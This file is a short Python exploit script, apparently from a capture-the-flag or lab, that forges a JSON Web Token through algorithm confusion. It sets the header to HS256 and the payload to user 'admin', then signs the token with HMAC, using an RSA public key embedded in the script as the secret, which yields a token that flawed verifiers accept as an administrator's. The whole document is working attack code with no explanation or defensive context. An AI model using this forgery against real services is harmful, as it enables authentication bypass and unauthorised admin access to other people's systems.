import base64
import json
import hmac
import hashlib

public_key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDLPaMvaLEtrAHieDdq1ufCHNj5
aXw+K2x207zvi8T81QD9tkvUcIkiAzrb0yWbwsfkO+14m80NZHNjj2PyuDdp7rsa
fEDqKrsSJJnx6DxybAiTqfKVqc2kgmPhJZq7JamarVokX8XQOppQPhRDE+utsXVo
2SbZm7AglA6T4z6H9wIDAQAB
-----END PUBLIC KEY-----"""

header = {"typ": "JWT", "alg": "HS256"}
payload = {"user": "admin"}

header_encoded = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
message = f"{header_encoded}.{payload_encoded}"
signature = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
jwt_token = f"{message}.{signature_encoded}"

print(jwt_token)
